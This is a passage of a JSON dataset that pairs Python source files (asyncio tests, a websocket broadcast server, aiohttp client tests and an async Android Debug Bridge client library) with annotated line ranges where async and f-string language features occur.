'_get_running_loop'),\n                         'No asyncio._get_running_loop')\n    def test_get_event_loop_returns_running_loop(self):\n        class Policy(asyncio.DefaultEventLoopPolicy):\n            def get_event_loop(self):\n                raise NotImplementedError\n        loop = None\n        old_policy = asyncio.get_event_loop_policy()\n        try:\n            asyncio.set_event_loop_policy(Policy())\n            loop = uvloop.new_event_loop()\n            self.assertIs(asyncio._get_running_loop(), None)\n            async def func():\n                self.assertIs(asyncio.get_event_loop(), loop)\n                self.assertIs(asyncio._get_running_loop(), loop)\n            loop.run_until_complete(func())\n        finally:\n            asyncio.set_event_loop_policy(old_policy)\n            if loop is not None:\n                loop.close()\n        self.assertIs(asyncio._get_running_loop(), None)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        397,
                        398,
                        "async for",
                        "async for _ in waiter(1, finalized, self.loop):\n                pass"
                    ],
                    [
                        419,
                        420,
                        "async for",
                        "async for _ in waiter(1, self.loop):\n                pass"
                    ]
                ]
            }
        },
        "78": {
            "file": "import asyncio\nimport websockets\nfrom utils.logger import get_logger\nfrom websockets import WebSocketServerProtocol\nlogger = get_logger('WebSocketServer')\nclass WebSocketServer:\n    clients = set()\n    async def register(self, ws: WebSocketServerProtocol) -> None:\n        self.clients.add(ws)\n        logger.info(f'{ws.remote_address} connects.')\n    async def unregister(self, ws: WebSocketServerProtocol) -> None:\n        self.clients.remove(ws)\n        logger.info(f'{ws.remote_address} disconnects.')\n    async def send_to_clients(self, message: str) -> None:\n        if self.clients:\n            await asyncio.wait([client.send(message) for client in self.clients])\n    async def ws_handler(self, ws: WebSocketServerProtocol, uri: str) -> None:\n        await self.register(ws)\n        try:\n            await self.distribute(ws)\n        finally:\n            await self.unregister(ws)\n    async def distribute(self, ws: WebSocketServerProtocol) -> None:\n        async for message in ws:\n            await self.send_to_clients(message)\nif __name__ == '__main__':\n    server = WebSocketServer()\n    logger.info('Start listening..')\n    start_server = websockets.serve(server.ws_handler, 'localhost', 4001)\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(start_server)\n    loop.run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        24,
                        25,
                        "async for",
                        "async for message in ws:\n            await self.send_to_clients(message)"
                    ]
                ],
                "pep_498": [
                    [
                        10,
                        "        logger.info(f'{ws.remote_address} connects.')"
                    ],
                    [
                        13,
                        "        logger.info(f'{ws.remote_address} disconnects.')"
                    ]
                ]
            }
        },
        "79": {
            "file": "import asyncio\nfrom collections.abc import Coroutine\nimport pytest\nimport aiohttp\nfrom aiohttp import web\nfrom aiohttp.client import _RequestContextManager\nasync def test_await(test_server, loop):\n    async def handler(request):\n        resp = web.StreamResponse(headers={'content-length': str(4)})\n        await resp.prepare(request)\n        await resp.drain()\n        await asyncio.sleep(0.01, loop=loop)\n        resp.write(b'test')\n        await asyncio.sleep(0.01, loop=loop)\n        await resp.write_eof()\n        return resp\n    app = web.Application(loop=loop)\n    app.router.add_route('GET', '/', handler)\n    server = await test_server(app)\n    with aiohttp.ClientSession(loop=loop) as session:\n        resp = await session.get(server.make_url('/'))\n        assert resp.status == 200\n        assert resp.connection is not None\n        await resp.read()\n        await resp.release()\n        assert resp.connection is None\nasync def test_response_context_manager(test_server, loop):\n    async def handler(request):\n        return web.HTTPOk()\n    app = web.Application(loop=loop)\n    app.router.add_route('GET', '/', handler)\n    server = await test_server(app)\n    resp = await aiohttp.ClientSession(loop=loop).get(server.make_url('/'))\n    async with resp:\n        assert resp.status == 200\n        assert resp.connection is None\n    assert resp.connection is None\nasync def test_response_context_manager_error(test_server, loop):\n    async def handler(request):\n        return web.HTTPOk()\n    app = web.Application(loop=loop)\n    app.router.add_route('GET', '/', handler)\n    server = await test_server(app)\n    session = aiohttp.ClientSession(loop=loop)\n    cm = session.get(server.make_url('/'))\n    resp = await cm\n    with pytest.raises(RuntimeError):\n        async with resp:\n            assert resp.status == 200\n            resp.content.set_exception(RuntimeError())\n            await resp.read()\n            assert resp.closed\n    assert len(session._connector._conns) == 1\nasync def test_client_api_context_manager(test_server, loop):\n    async def handler(request):\n        return web.HTTPOk()\n    app = web.Application(loop=loop)\n    app.router.add_route('GET', '/', handler)\n    server = await test_server(app)\n    async with aiohttp.ClientSession(loop=loop) as session:\n        async with session.get(server.make_url('/')) as resp:\n            assert resp.status == 200\n            assert resp.connection is None\n    assert resp.connection is None\ndef test_ctx_manager_is_coroutine():\n    assert issubclass(_RequestContextManager, Coroutine)\nasync def test_context_manager_close_on_release(test_server, loop, mocker):\n    async def handler(request):\n        resp = web.StreamResponse()\n        await resp.prepare(request)\n        await resp.drain()\n        await asyncio.sleep(10, loop=loop)\n        return resp\n    app = web.Application(loop=loop)\n    app.router.add_route('GET', '/', handler)\n    server = await test_server(app)\n    with aiohttp.ClientSession(loop=loop) as session:\n        resp = await session.get(server.make_url('/'))\n        proto = resp.connection._protocol\n        mocker.spy(proto, 'close')\n        async with resp:\n            assert resp.status == 200\n            assert resp.connection is not None\n        assert resp.connection is None\n        assert proto.close.called\nasync def test_iter_any(test_server, loop):\n    data = b'0123456789' * 1024\n    async def handler(request):\n        buf = []\n        async for raw in request.content.iter_any():\n            buf.append(raw)\n        assert b''.join(buf) == data\n        return web.Response()\n    app = web.Application(loop=loop)\n    app.router.add_route('POST', '/', handler)\n    server = await test_server(app)\n    with aiohttp.ClientSession(loop=loop) as session:\n        async with await session.post(server.make_url('/'), data=data) as resp:\n            assert resp.status == 200",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        90,
                        91,
                        "async for",
                        "async for raw in request.content.iter_any():\n            buf.append(raw)"
                    ]
                ]
            }
        },
        "80": {
            "file": "from asyncio import Lock, get_running_loop\nimport logging\nimport os\nimport struct\nimport time\nimport aiofiles\nfrom . import constants\nfrom . import exceptions\nfrom .adb_message import AdbMessage, checksum, int_to_cmd, unpack\nfrom .transport.base_transport_async import BaseTransportAsync\nfrom .transport.tcp_transport_async import TcpTransportAsync\nfrom .hidden_helpers import DeviceFile, _AdbPacketStore, _AdbTransactionInfo, _FileSyncTransactionInfo, get_banner, get_files_to_push\n_LOGGER = logging.getLogger(__name__)\nclass _AdbIOManagerAsync(object):\n    def __init__(self, transport):\n        self._packet_store = _AdbPacketStore()\n        self._transport = transport\n        self._store_lock = Lock()\n        self._transport_lock = Lock()\n    async def close(self):\n        async with self._transport_lock:\n            await self._transport.close()\n            async with self._store_lock:\n                self._packet_store.clear_all()\n    async def connect(self, banner, rsa_keys, auth_timeout_s, auth_callback, adb_info):\n        async with self._transport_lock:\n            await self._transport.close()\n            async with self._store_lock:\n                self._packet_store.clear_all()\n            await self._transport.connect(adb_info.transport_timeout_s)\n            msg = AdbMessage(constants.CNXN, constants.VERSION, constants.MAX_ADB_DATA, b'host::%s\\0' % banner)\n            await self._send(msg, adb_info)\n            cmd, arg0, maxdata, banner2 = await self._read_expected_packet_from_device([constants.AUTH, constants.CNXN], adb_info)\n            if cmd != constants.AUTH:\n                return True, maxdata\n            if not rsa_keys:\n                await self._transport.close()\n                raise exceptions.DeviceAuthError('Device authentication required, no keys available.')\n            for rsa_key in rsa_keys:\n                if arg0 != constants.AUTH_TOKEN:\n                    await self._transport.close()\n                    raise exceptions.InvalidResponseError('Unknown AUTH response: %s %s %s' % (arg0, maxdata, banner2))\n                signed_token = rsa_key.Sign(banner2)\n                msg = AdbMessage(constants.AUTH, constants.AUTH_SIGNATURE, 0, signed_token)\n                await self._send(msg, adb_info)\n                cmd, arg0, maxdata, banner2 = await self._read_expected_packet_from_device([constants.CNXN, constants.AUTH], adb_info)\n                if cmd == constants.CNXN:\n                    return True, maxdata\n            pubkey = rsa_keys[0].GetPublicKey()\n            if not isinstance(pubkey, (bytes, bytearray)):\n                pubkey = bytearray(pubkey, 'utf-8')\n            if auth_callback is not None:\n                auth_callback(self)\n            msg = AdbMessage(constants.AUTH, constants.AUTH_RSAPUBLICKEY, 0, pubkey + b'\\0')\n            await self._send(msg, adb_info)\n            adb_info.transport_timeout_s = auth_timeout_s\n            _, _, maxdata, _ = await self._read_expected_packet_from_device([constants.CNXN], adb_info)\n            return True, maxdata\n    async def read(self, expected_cmds, adb_info, allow_zeros=False):\n        async with self._store_lock:\n            arg0_arg1 = self._packet_store.find(adb_info.remote_id, adb_info.local_id) if not allow_zeros else self._packet_store.find_allow_zeros(adb_info.remote_id, adb_info.local_id)\n            while arg0_arg1:\n                cmd, arg0, arg1, data = self._packet_store.get(arg0_arg1[0], arg0_arg1[1])\n                if cmd in expected_cmds:\n                    return cmd, arg0, arg1, data\n                arg0_arg1 = self._packet_store.find(adb_info.remote_id, adb_info.local_id) if not allow_zeros else self._packet_store.find_allow_zeros(adb_info.remote_id, adb_info.local_id)\n        start = time.time()\n        while True:\n            async with self._transport_lock:\n                async with self._store_lock:\n                    arg0_arg1 = self._packet_store.find(adb_info.remote_id, adb_info.local_id) if not allow_zeros else self._packet_store.find_allow_zeros(adb_info.remote_id, adb_info.local_id)\n                    while arg0_arg1:\n                        cmd, arg0, arg1, data = self._packet_store.get(arg0_arg1[0], arg0_arg1[1])\n                        if cmd in expected_cmds:\n                            return cmd, arg0, arg1, data\n                        arg0_arg1 = self._packet_store.find(adb_info.remote_id, adb_info.local_id) if not allow_zeros else self._packet_store.find_allow_zeros(adb_info.remote_id, adb_info.local_id)\n                cmd, arg0, arg1, data = await self._read_packet_from_device(adb_info)\n                if not adb_info.args_match(arg0, arg1, allow_zeros):\n                    async with self._store_lock:\n                        self._packet_store.put(arg0, arg1, cmd, data)\n                else:\n                    if cmd == constants.CLSE:\n                        async with self._store_lock:\n                            self._packet_store.clear(arg0, arg1)\n                    if cmd in expected_cmds:\n                        return cmd, arg0, arg1, data\n            if time.time() - start > adb_info.read_timeout_s:\n                break\n        raise exceptions.AdbTimeoutError(\"Never got one of the expected responses: {} (transport_timeout_s = {}, read_timeout_s = {})\".format(expected_cmds, adb_info.transport_timeout_s, adb_info.read_timeout_s))\n    async def send(self, msg, adb_info):\n        async with self._transport_lock:\n            await self._send(msg, adb_info)\n    async def _read_expected_packet_from_device(self, expected_cmds, adb_info):\n        start = time.time()\n        while True:\n            cmd, arg0, arg1, data = await self._read_packet_from_device(adb_info)\n            if cmd in expected_cmds:\n                return cmd, arg0, arg1, data\n            if time.time() - start > adb_info.read_timeout_s:\n                raise exceptions.AdbTimeoutError(\"Never got one of the expected responses: {} (transport_timeout_s = {}, read_timeout_s = {})\".format(expected_cmds, adb_info.transport_timeout_s, adb_info.read_timeout_s))\n    async def _read_bytes_from_device(self, length, adb_info):\n        start = time.time()\n        data = bytearray()\n        while length > 0:\n            temp = await self._transport.bulk_read(length, adb_info.transport_timeout_s)\n            if temp:\n                _LOGGER.debug(\"bulk_read(%d): %.1000r\", length, temp)\n            data += temp\n            length -= len(temp)\n            if length == 0:\n                break\n            if time.time() - start > adb_info.read_timeout_s:\n                raise exceptions.AdbTimeoutError(\"Timeout: read {} of {} bytes (transport_timeout_s = {}, read_timeout_s = {})\".format(len(data), len(data) + length, adb_info.transport_timeout_s, adb_info.read_timeout_s))\n        return bytes(data)\n    async def _read_packet_from_device(self, adb_info):\n        msg = await self._read_bytes_from_device(constants.MESSAGE_SIZE, adb_info)\n        cmd, arg0, arg1, data_length, data_checksum = unpack(msg)\n        command = constants.WIRE_TO_ID.get(cmd)\n        if not command:\n            raise exceptions.InvalidCommandError(\"Unknown command: %d = '%s' (arg0 = %d, arg1 = %d, msg = '%s')\" % (cmd, int_to_cmd(cmd), arg0, arg1, msg))\n        if data_length == 0:\n            return command, arg0, arg1, b\"\"\n        data = await self._read_bytes_from_device(data_length, adb_info)\n        actual_checksum = checksum(data)\n        if actual_checksum != data_checksum:\n            raise exceptions.InvalidChecksumError(\"Received checksum {} != {}\".format(actual_checksum, data_checksum))\n        return command, arg0, arg1, data\n    async def _send(self, msg, adb_info):\n        packed = msg.pack()\n        _LOGGER.debug(\"bulk_write(%d): %r\", len(packed), packed)\n        await self._transport.bulk_write(packed, adb_info.transport_timeout_s)\n        if msg.data:\n            _LOGGER.debug(\"bulk_write(%d): %r\", len(msg.data), msg.data)\n            await self._transport.bulk_write(msg.data, adb_info.transport_timeout_s)\nclass AdbDeviceAsync(object):\n    def __init__(self, transport, default_transport_timeout_s=None, banner=None):\n        if banner and not isinstance(banner, (bytes, bytearray)):\n            self._banner = bytearray(banner, 'utf-8')\n        else:\n            self._banner = banner\n        if not isinstance(transport, BaseTransportAsync):\n            raise exceptions.InvalidTransportError(\"`transport` must be an instance of a subclass of `BaseTransportAsync`\")\n        self._io_manager = _AdbIOManagerAsync(transport)\n        self._available = False\n        self._default_transport_timeout_s = default_transport_timeout_s\n        self._local_id = 0\n        self._local_id_lock = Lock()\n        self._maxdata = constants.MAX_PUSH_DATA\n    @property\n    def available(self):\n        return self._available\n    @property\n    def max_chunk_size(self):\n        return min(constants.MAX_CHUNK_SIZE, self._maxdata // 2) or constants.MAX_PUSH_DATA\n    def _get_transport_timeout_s(self, transport_timeout_s):\n        return transport_timeout_s if transport_timeout_s is not None else self._default_transport_timeout_s\n    async def close(self):\n        self._available = False\n        await self._io_manager.close()\n    async def connect(self, rsa_keys=None, transport_timeout_s=None, auth_timeout_s=constants.DEFAULT_AUTH_TIMEOUT_S, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, auth_callback=None):\n        if not self._banner:\n            self._banner = await get_running_loop().run_in_executor(None, get_banner)\n        adb_info = _AdbTransactionInfo(None, None, self._get_transport_timeout_s(transport_timeout_s), read_timeout_s, None)\n        self._available = False\n        self._available, self._maxdata = await self._io_manager.connect(self._banner, rsa_keys, auth_timeout_s, auth_callback, adb_info)\n        return self._available\n    async def _service(self, service, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, timeout_s=None, decode=True):\n        if decode:\n            return b''.join([x async for x in self._streaming_command(service, command, transport_timeout_s, read_timeout_s, timeout_s)]).decode('utf8')\n        return b''.join([x async for x in self._streaming_command(service, command, transport_timeout_s, read_timeout_s, timeout_s)])\n    async def _streaming_service(self, service, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, decode=True):\n        stream = self._streaming_command(service, command, transport_timeout_s, read_timeout_s, None)\n        if decode:\n            async for line in (stream_line.decode('utf8') async for stream_line in stream):\n                yield line\n        else:\n            async for line in stream:\n                yield line\n    async def exec_out(self, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, timeout_s=None, decode=True):\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        return await self._service(b'exec', command.encode('utf8'), transport_timeout_s, read_timeout_s, timeout_s, decode)\n    async def reboot(self, fastboot=False, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, timeout_s=None):\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        await self._open(b'reboot:bootloader' if fastboot else b'reboot:', transport_timeout_s, read_timeout_s, timeout_s)\n    async def root(self, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, timeout_s=None):\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        await self._service(b'root', b'', transport_timeout_s, read_timeout_s, timeout_s, False)\n    async def shell(self, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, timeout_s=None, decode=True):\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        return await self._service(b'shell', command.encode('utf8'), transport_timeout_s, read_timeout_s, timeout_s, decode)\n    async def streaming_shell(self, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, decode=True):\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        async for line in self._streaming_service(b'shell', command.encode('utf8'), transport_timeout_s, read_timeout_s, decode):\n            yield line\n    async def list(self, device_path, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S):\n        if not device_path:\n            raise exceptions.DevicePathInvalidError(\"Cannot list an empty device path\")\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        adb_info = await self._open(b'sync:', transport_timeout_s, read_timeout_s, None)\n        filesync_info = _FileSyncTransactionInfo(constants.FILESYNC_LIST_FORMAT, maxdata=self._maxdata)\n        await self._filesync_send(constants.LIST, adb_info, filesync_info, data=device_path)\n        files = []\n        async for cmd_id, header, filename in self._filesync_read_until([constants.DENT], [constants.DONE], adb_info, filesync_info):\n            if cmd_id == constants.DONE:\n                break\n            mode, size, mtime = header\n            files.append(DeviceFile(filename, mode, size, mtime))\n        await self._clse(adb_info)\n        return files\n    async def pull(self, device_path, local_path, progress_callback=None, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S):\n        if not device_path:\n            raise exceptions.DevicePathInvalidError(\"Cannot pull from an empty device path\")\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        async with aiofiles.open(local_path, 'wb') as stream:\n            adb_info = await self._open(b'sync:', transport_timeout_s, read_timeout_s, None)\n            filesync_info = _FileSyncTransactionInfo(constants.FILESYNC_PULL_FORMAT, maxdata=self._maxdata)\n            try:\n                await self._pull(device_path, stream, progress_callback, adb_info, filesync_info)\n            finally:\n                await self._clse(adb_info)\n    async def _pull(self, device_path, stream, progress_callback, adb_info, filesync_info):\n        if progress_callback:\n            total_bytes = (await self.stat(device_path))[1]\n        await self._filesync_send(constants.RECV, adb_info, filesync_info, data=device_path)\n        async for cmd_id, _, data in self._filesync_read_until([constants.DATA], [constants.DONE], adb_info, filesync_info):\n            if cmd_id == constants.DONE:\n                break\n            await stream.write(data)\n            if progress_callback:\n                try:\n                    await progress_callback(device_path, len(data), total_bytes)\n                except:  \n                    pass\n    async def push(self, local_path, device_path, st_mode=constants.DEFAULT_PUSH_MODE, mtime=0, progress_callback=None, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S):\n        if not device_path:\n            raise exceptions.DevicePathInvalidError(\"Cannot push to an empty device path\")\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        local_path_is_dir, local_paths, device_paths = await get_running_loop().run_in_executor(None, get_files_to_push, local_path, device_path)\n        if local_path_is_dir:\n            await self.shell(\"mkdir \" + device_path, transport_timeout_s, read_timeout_s)\n        for _local_path, _device_path in zip(local_paths, device_paths):\n            async with aiofiles.open(_local_path, 'rb') as stream:\n                adb_info = await self._open(b'sync:', transport_timeout_s, read_timeout_s, None)\n                filesync_info = _FileSyncTransactionInfo(constants.FILESYNC_PUSH_FORMAT, maxdata=self._maxdata)\n                await self._push(stream, _device_path, st_mode, mtime, progress_callback, adb_info, filesync_info)\n            await self._clse(adb_info)\n    async def _push(self, stream, device_path, st_mode, mtime, progress_callback, adb_info, filesync_info):\n        fileinfo = ('{},{}'.format(device_path, int(st_mode))).encode('utf-8')\n        await self._filesync_send(constants.SEND, adb_info, filesync_info, data=fileinfo)\n        if progress_callback:\n            total_bytes = (await get_running_loop().run_in_executor(None, os.fstat, stream.fileno())).st_size\n        while True:\n            data = await stream.read(self.max_chunk_size)\n            if data:\n                await self._filesync_send(constants.DATA, adb_info, filesync_info, data=data)\n                if progress_callback:\n                    try:\n                        await progress_callback(device_path, len(data), total_bytes)\n                    except:  \n                        pass\n            else:\n                break\n        if mtime == 0:\n            mtime = int(time.time())\n        await self._filesync_send(constants.DONE, adb_info, filesync_info, size=mtime)\n        async for cmd_id, _, data in self._filesync_read_until([], [constants.OKAY, constants.FAIL], adb_info, filesync_info):\n            if cmd_id == constants.OKAY:\n                return\n            raise exceptions.PushFailedError(data)\n    async def stat(self, device_path, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S):\n        if not device_path:\n            raise exceptions.DevicePathInvalidError(\"Cannot stat an empty device path\")\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        adb_info = await self._open(b'sync:', transport_timeout_s, read_timeout_s, None)\n        filesync_info = _FileSyncTransactionInfo(constants.FILESYNC_STAT_FORMAT, maxdata=self._maxdata)\n        await self._filesync_send(constants.STAT, adb_info, filesync_info, data=device_path)\n        _, (mode, size, mtime), _ = await self._filesync_read([constants.STAT], adb_info, filesync_info)\n        await self._clse(adb_info)\n        return mode, size, mtime\n    async def _clse(self, adb_info):\n        msg = AdbMessage(constants.CLSE, adb_info.local_id, adb_info.remote_id)\n        await self._io_manager.send(msg, adb_info)\n        await self._read_until([constants.CLSE], adb_info)\n    async def _okay(self, adb_info):\n        msg = AdbMessage(constants.OKAY, adb_info.local_id, adb_info.remote_id)\n        await self._io_manager.send(msg, adb_info)\n    async def _open(self, destination, transport_timeout_s, read_timeout_s, timeout_s):\n        async with self._local_id_lock:\n            self._local_id += 1\n            if self._local_id == 2**32:\n                self._local_id = 1\n            adb_info = _AdbTransactionInfo(self._local_id, None, self._get_transport_timeout_s(transport_timeout_s), read_timeout_s, timeout_s)\n        msg = AdbMessage(constants.OPEN, adb_info.local_id, 0, destination + b'\\0')\n        await self._io_manager.send(msg, adb_info)\n        _, adb_info.remote_id, _, _ = await self._io_manager.read([constants.OKAY], adb_info)\n        return adb_info\n    async def _read_until(self, expected_cmds, adb_info):\n        cmd, _, _, data = await self._io_manager.read(expected_cmds, adb_info, allow_zeros=True)\n        if cmd == constants.WRTE:\n            await self._okay(adb_info)\n        return cmd, data\n    async def _read_until_close(self, adb_info):\n        start = time.time()\n        while True:\n            cmd, data = await self._read_until([constants.CLSE, constants.WRTE], adb_info)\n            if cmd == constants.CLSE:\n                msg = AdbMessage(constants.CLSE, adb_info.local_id, adb_info.remote_id)\n                await self._io_manager.send(msg, adb_info)\n                break\n            yield data\n            if adb_info.timeout_s is not None and time.time() - start > adb_info.timeout_s:\n                raise exceptions.AdbTimeoutError(\"The command did not complete within {} seconds\".format(adb_info.timeout_s))\n    async def _streaming_command(self, service, command, transport_timeout_s, read_timeout_s, timeout_s):\n        adb_info = await self._open(b'%s:%s' % (service, command), transport_timeout_s, read_timeout_s, timeout_s)\n        async for data in self._read_until_close(adb_info):\n            yield data\n    async def _filesync_flush(self, adb_info, filesync_info):\n        msg = AdbMessage(constants.WRTE, adb_info.local_id, adb_info.remote_id, filesync_info.send_buffer[:filesync_info.send_idx])\n        await self._io_manager.send(msg, adb_info)\n        await self._read_until([constants.OKAY], adb_info)\n        filesync_info.send_idx = 0\n    async def _filesync_read(self, expected_ids, adb_info, filesync_info):\n        if filesync_info.send_idx:\n            await self._filesync_flush(adb_info, filesync_info)\n        header_data = await self._filesync_read_buffered(filesync_info.recv_message_size, adb_info, filesync_info)\n        header = struct.unpack(filesync_info.recv_message_format, header_data)\n        command_id = constants.FILESYNC_WIRE_TO_ID[header[0]]\n        read_data = command_id != constants.STAT\n        if read_data:\n            data = await self._filesync_read_buffered(header[-1], adb_info, filesync_info)\n        else:\n            data = bytearray()\n        if command_id not in expected_ids:\n            if command_id == constants.FAIL:\n                reason = data.decode('utf-8', errors='ignore')\n                raise exceptions.AdbCommandFailureException('Command failed: {}'.format(reason))\n            raise exceptions.InvalidResponseError('Expected one of %s, got %s' % (expected_ids, command_id))\n        if not read_data:\n            return command_id, header[1:], None\n        return command_id, header[1:-1], data\n    async def _filesync_read_buffered(self, size, adb_info, filesync_info):\n        while len(filesync_info.recv_buffer) < size:\n            _, data = await self._read_until([constants.WRTE], adb_info)\n            filesync_info.recv_buffer += data\n        result = filesync_info.recv_buffer[:size]\n        filesync_info.recv_buffer = filesync_info.recv_buffer[size:]\n        return result\n    async def _filesync_read_until(self, expected_ids, finish_ids, adb_info, filesync_info):\n        while True:\n            cmd_id, header, data = await self._filesync_read(expected_ids + finish_ids, adb_info, filesync_info)\n            yield cmd_id, header, data\n            if cmd_id in finish_ids:  \n                break\n    async def _filesync_send(self, command_id, adb_info, filesync_info, data=b'', size=None):\n        if not isinstance(data, bytes):\n            data = data.encode('utf8')\n        if size is None:\n            size = len(data)\n        if not filesync_info.can_add_to_send_buffer(len(data)):\n            await self._filesync_flush(adb_info, filesync_info)\n        buf = struct.pack(b'<2I', constants.FILESYNC_ID_TO_WIRE[command_id], size) + data\n        filesync_info.send_buffer[filesync_info.send_idx:filesync_info.send_idx + len(buf)] = buf\n        filesync_info.send_idx += len(buf)\nclass AdbDeviceTcpAsync(AdbDeviceAsync):\n    def __init__(self, host, port=5555, default_transport_timeout_s=None, banner=None):\n        transport = TcpTransportAsync(host, port)\n        super(AdbDeviceTcpAsync, self).__init__(transport, default_transport_timeout_s, banner)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "from asyncio import Lock, get_running_loop"
                    ]
                ],
                "pep_530": [
                    [
                        170,
                        "return b''.join([x async for x in self._streaming_command(service, command, transport_timeout_s, read_timeout_s, timeout_s)])"
                    ],
                    [
                        174,
                        "async for line in (stream_line.decode('utf8') async for stream_line in stream):"
                    ],
                    [
                        169,
                        "return b''.join([x async for x in self._streaming_command(service, command, transport_timeout_s, read_timeout_s, timeout_s)]).decode('utf8')"
                    ]
                ],
                "pep_525": [
                    [
                        171,
                        178,
                        "async generator",
                        "async def _streaming_service(self, service, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, decode=True):\n        stream = self._streaming_command(service, command, transport_timeout_s, read_timeout_s, None)\n        if decode:\n            async for line in (stream_line.decode('utf8') async for stream_line in stream):\n                yield line\n        else:\n            async for line in stream:\n                yield line"
                    ],
                    [
                        195,
                        199,
                        "async generator",
                        "async def streaming_shell(self, command, transport_timeout_s=None, read_timeout_s=constants.DEFAULT_READ_TIMEOUT_S, decode=True):\n        if not self.available:\n            raise exceptions.AdbConnectionError(\"ADB command not sent because a connection to the device has not been established.  (Did you call `AdbDeviceAsync.connect()`?)\")\n        async for line in self._streaming_service(b'shell', command.encode('utf8'), transport_timeout_s, read_timeout_s, decode):\n            yield line"
                    ],
                    [
                        311,
                        321,
                        "async generator",
                        "async def _read_until_close(self, adb_info):\n        start = time.time()\n        while True:\n            cmd, data = await self._read_until([constants.CLSE, constants.WRTE], adb_info)\n            if cmd == constants.CLSE:\n                msg = AdbMessage(constants.CLSE, adb_info.local_id, adb_info.remote_id)\n                await self._io_manager.send(msg, adb_info)\n                break\n            yield data\n            if adb_info.timeout_s is not None and time.time() - start > adb_info.timeout_s:\n                raise exceptions.AdbTimeoutError(\"The command did not complete within {} seconds\".format(adb_info.timeout_s))"
                    ],
                    [
                        322,
                        325,
                        "async generator",
                        "async def _streaming_command(self, service, command, transport_timeout_s, read_timeout_s, timeout_s):\n        adb_info = await self._open(b'%s:%s' % (service, command), transport_timeout_s, read_timeout_s, timeout_s)\n        async for data in self._read_until_close(adb_info):\n            yield data"
                    ],
                    [
                        357,
                        362,
                        "async generator",
                        "async def _filesync_read_until(self, expected_ids, finish_ids, adb_info, filesync_info):\n        while True:\n            cmd_id, header, data = await self._filesync_read(expected_ids + finish_ids, adb_info, filesync_info)\n            yield cmd_id, header, data\n            if cmd_id in finish_ids:  \n                break"
                    ],
                    [
                        198,
                        199,
                        "async for",
                        "async for line in self._streaming_service(b'shell', command.encode('utf8'), transport_timeout_s, read_timeout_s, decode):\n            yield line"
                    ],
                    [
                        209,
                        213,
                        "async for",
                        "async for cmd_id, header, filename in self._filesync_read_until([constants.DENT], [constants.DONE], adb_info, filesync_info):\n            if cmd_id == constants.DONE:\n                break\n            mode, size, mtime = header\n            files.append(DeviceFile(filename, mode, size, mtime))"
                    ],
                    [
                        232,
                        240,
                        "async for",
                        "async for cmd_id, _, data in self._filesync_read_until([constants.DATA], [constants.DONE], adb_info, filesync_info):\n            if cmd_id == constants.DONE:\n                break\n            await stream.write(data)\n            if progress_callback:\n                try:\n                    await progress_callback(device_path, len(data), total_bytes)\n                except:  \n                    pass"
                    ],
                    [
                        274,
                        277,
                        "async for",
                        "async for cmd_id, _, data in self._filesync_read_until([], [constants.OKAY, constants.FAIL], adb_info, filesync_info):\n            if cmd_id == constants.OKAY:\n                return\n            raise exceptions.PushFailedError(data)"
                    ],
                    [
                        324,
                        325,
                        "async for",
                        "async for data in self._read_until_close(adb_info):\n            yield data"
                    ],
                    [
                        174,
                        175,
                        "async for",
                        "async for line in (stream_line.decode('utf8') async for stream_line in stream):\n                yield line"
                    ],
                    [
                        177,
                        178,
                        "async for",
                        "async for line in stream:\n                yield line"
                    ]
                ],
                "pep_498v": [
                    [
                        89,
                        89,
                        ".format()"
                    ],
                    [
                        120,
                        120,
                        "%"
                    ],
                    [
                        126,
                        126,
                        ".format()"
                    ],
                    [
                        256,
                        256,
                        ".format()"
                    ],
                    [
                        346,
                        346,
                        "%"
                    ],
                    [
                        100,
                        100,
                        ".format()"
                    ],
                    [
                        113,
                        113,
                        ".format()"
                    ],
                    [
                        321,
